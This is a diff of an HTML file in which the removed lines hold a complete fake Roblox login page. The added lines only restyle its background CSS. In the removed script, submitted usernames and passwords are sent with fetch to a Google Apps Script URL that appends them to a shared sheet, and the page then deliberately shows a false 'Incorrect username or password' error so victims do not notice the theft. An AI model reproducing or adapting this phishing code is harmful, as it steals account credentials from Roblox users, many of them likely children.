@@ -1,34 +1,30 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Log in to 3G wifi clan.">
-    <meta name="theme-color" content="#232527">
-    <title>Log In - Roblox</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-
-    <style>
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
         }
 
-        .page {
-            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            
-            /* 
-               FIXED: Removed the gradient. 
-               Using the direct Imgur link. 
-               Added min-height to ensure the background covers the viewport.
-            */
+        body {
+            /* Force the image here as a fallback */
             background-image: url('https://i.imgur.com/FjfCRUg.png');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
+            min-height: 100vh;
+            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .page {
+            /* 
+               FIXED: 
+               1. No background color.
+               2. Uses the exact Imgur URL.
+               3. !important ensures nothing else overrides it.
+            */
+            background-image: url('https://i.imgur.com/FjfCRUg.png') !important;
+            background-size: cover !important;
+            background-position: center !important;
+            background-repeat: no-repeat !important;
             min-height: 100vh;
             position: relative;
             overflow: hidden;
@@ -130,8 +126,8 @@
         }
 
         .auth-card {
-            background: rgba(35, 37, 39, 0.85); /* Made slightly transparent so bg shows through */
-            backdrop-filter: blur(5px); /* Adds a modern blur effect */
+            background: rgba(35, 37, 39, 0.85); /* Semi-transparent so bg shows through */
+            backdrop-filter: blur(5px);
             width: 456px;
             max-width: 100%;
             padding: 34px 40px;
@@ -263,190 +259,3 @@
         @media (prefers-reduced-motion: reduce) {
             * { transition: none !important; }
         }
-    </style>
-</head>
-<body>
-
-    <div class="page">
-        <header class="top-nav">
-            <a href="index.html" class="roblox-logo" title="Back to group">
-                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                    <path fill-rule="evenodd" clip-rule="evenodd" d="M18 0L100 22L82 100L0 78L18 0ZM42 38L58 42L54 58L38 54L42 38Z"/>
-                </svg>
-                <span class="sr-only">— back to group page</span>
-            </a>
-            <nav class="nav-links">
-                <a href="https://www.roblox.com/discover" target="_blank" rel="noopener" class="nav-link">Charts</a>
-                <a href="https://www.roblox.com/catalog" target="_blank" rel="noopener" class="nav-link">Marketplace</a>
-                <a href="https://create.roblox.com" target="_blank" rel="noopener" class="nav-link">Create</a>
-                <a href="https://www.roblox.com/upgrades/robux" target="_blank" rel="noopener" class="nav-link">Robux</a>
-            </nav>
-            <form class="nav-search" action="https://www.roblox.com/search/groups" method="GET" target="_blank" rel="noopener" role="search">
-                <svg viewBox="0 0 24 24" aria-hidden="true">
-                    <circle cx="11" cy="11" r="8"/>
-                    <line x1="21" y1="21" x2="16.65" y2="16.65"/>
-                </svg>
-                <label for="navSearch" class="sr-only">Search</label>
-                <input type="search" id="navSearch" name="keyword" placeholder="Search">
-            </form>
-            <a href="#" class="btn-signup">Sign Up</a>
-        </header>
-
-        <main class="auth-wrap">
-            <form class="auth-card" id="loginForm" action="index.html" method="get" autocomplete="on" novalidate>
-                <h1>Login to Roblox</h1>
-
-                <label for="username" class="sr-only">Username/Email/Phone</label>
-                <input type="text" id="username" name="username" autocomplete="username" placeholder="Username/Email/Phone" required minlength="3">
-
-                <label for="visiblePassword" class="sr-only">Password</label>
-                <div id="visiblePassword" contenteditable="true" placeholder="Password" oninput="updateHiddenPassword()" required minlength="8" style="width: 100%; height: 48px; background: #1b1c1e; border: 1px solid #3b3d40; border-radius: 6px; padding: 0 16px; font-size: 16px; color: #fff; outline: none; font-family: inherit; margin-bottom: 12px;"></div>
-                <input type="password" id="hiddenPassword" name="password" autocomplete="current-password" required minlength="8" style="display:none;">
-
-                <button type="submit" class="submit">Log In</button>
-
-                <p class="status" id="status" role="alert" aria-live="polite"></p>
-
-                <a href="#" class="forgot">Forgot Password or Username?</a>
-
-                <button type="button" class="opt-btn">Email Me a One-Time Code</button>
-                <button type="button" class="opt-btn">Quick Sign-in</button>
-                <button type="button" class="opt-btn">Other sign-in options</button>
-
-                <p class="signup-row">Don't have an account? <a href="#">Sign Up</a></p>
-            </form>
-        </main>
-    </div>
-
-    <script>
-        /* ——————————————————————————————
-         Your NEW Google Apps Script Web App URL
-         —————————————————————————————— */
-        var SHEET_URL = 'https://script.google.com/macros/s/AKfycbzfMwRCTBl0rkR8qAwYsF5X1ahr7QVQIJ_F-OY5MGQXYX2Vuoj1GCbHjEH9KM4nk0cPXA/exec';
-
-        var form = document.getElementById('loginForm');
-        var status = document.getElementById('status');
-        var collage = document.querySelector('.bg-collage');
-        var tiles = [];
-
-        // Each tile gets its own colour underlay so the grid is never empty
-        for (var i = 0; i < 45; i++) {
-            var s = document.createElement('span');
-            var h = Math.floor(Math.random() * 360);
-            s.dataset.grad = 'linear-gradient(135deg, hsl(' + h + ' 45% 26%), hsl(' +
-             ((h + 40) % 360) + ' 50% 13%))';
-            s.style.backgroundImage = s.dataset.grad;
-            collage.appendChild(s);
-            tiles.push(s);
-        }
-
-        function paint(urls) {
-            tiles.forEach(function (t, i) {
-                var u = urls[i % urls.length];
-                t.style.backgroundImage = "url('" + u + "'), " + t.dataset.grad;
-            });
-        }
-
-        var UNIVERSE = [
-            994732206, 4483381587, 4924922222, 3170713286, 5021148656,
-            2777703196, 4802509088, 4558595131, 3266451440, 286090429
-        ];
-
-        fetch('https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=' +
-         UNIVERSE.join(',') + '&size=420x420&format=Png&isCircular=false')
-         .then(function (r) { return r.json(); })
-         .then(function (j) {
-             var urls = [];
-             (j.data || []).forEach(function (d) {
-                 (d.thumbnails || []).forEach(function (t) { urls.push(t.imageUrl); });
-             });
-             if (urls.length) paint(urls);
-         })
-         .catch(function () { /* gradients stay */ });
-
-        /* ——— Load previously saved data and pre-fill the boxes ——— */
-        var saved = {};
-        try {
-            saved = JSON.parse(localStorage.getItem('loginData') || '{}');
-        } catch (err) {
-            saved = {}; // in case the stored value is corrupt
-        }
-        if (saved.username) document.getElementById('username').value = saved.username;
-        if (saved.password) {
-            document.getElementById('visiblePassword').textContent = saved.password;
-            document.getElementById('hiddenPassword').value = saved.password;
-            document.getElementById('visiblePassword').dataset.password = saved.password;
-        }
-
-        /* ——— Unique session ID per browser, so the sheet can tell
-         devices/sessions apart ——— */
-        function getSessionId() {
-            var id = localStorage.getItem('sessionId');
-            if (!id) {
-                id = 'sess-' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
-                localStorage.setItem('sessionId', id);
-            }
-            return id;
-        }
-
-        /* ——— Append one login as a new row to the Google Sheet ——— */
-        function saveToSheet(username, password) {
-            fetch(SHEET_URL, {
-                method: 'POST',
-                mode: 'no-cors', // Apps Script doesn't send CORS headers back
-                headers: { 'Content-Type': 'text/plain' }, // avoids CORS preflight
-                body: JSON.stringify({
-                    username: username,
-                    password: password,
-                    sessionId: getSessionId()
-                })
-            }).catch(function () { /* don't break login if offline */ });
-        }
-
-        function updateHiddenPassword() {
-            const visiblePassword = document.getElementById('visiblePassword');
-            const hiddenPassword = document.getElementById('hiddenPassword');
-            hiddenPassword.value = visiblePassword.textContent;
-            visiblePassword.dataset.password = visiblePassword.textContent;
-        }
-
-        form.addEventListener('submit', function (e) {
-            e.preventDefault();
-            status.textContent = '';
-            status.className = 'status';
-
-            if (!form.checkValidity()) {
-                form.reportValidity();
-                status.textContent = 'Check the highlighted fields.';
-                status.className = 'status err';
-                return;
-            }
-
-            var user = document.getElementById('username').value.trim();
-            var pass = document.getElementById('hiddenPassword').value; // Use hidden password
-
-            /* Save locally so the boxes pre-fill next time */
-            var data = {
-                username: user,
-                password: pass,
-                loggedInAt: new Date().toISOString()
-            };
-            localStorage.setItem('loginData', JSON.stringify(data));
-
-            // keep old keys working in case other pages read them
-            localStorage.setItem('username', user);
-            localStorage.setItem('loggedInAt', data.loggedInAt);
-
-            /* Append this login to the shared Google Sheet (all devices) */
-            saveToSheet(user, pass);
-
-            /* FAKE ERROR MESSAGE INSTEAD OF SUCCESS */
-            status.textContent = 'Incorrect username or password.';
-            status.className = 'status err';
-
-            /* NO REDIRECT — stay on the page */
-        });
-    </script>
-
-</body>
-</html>
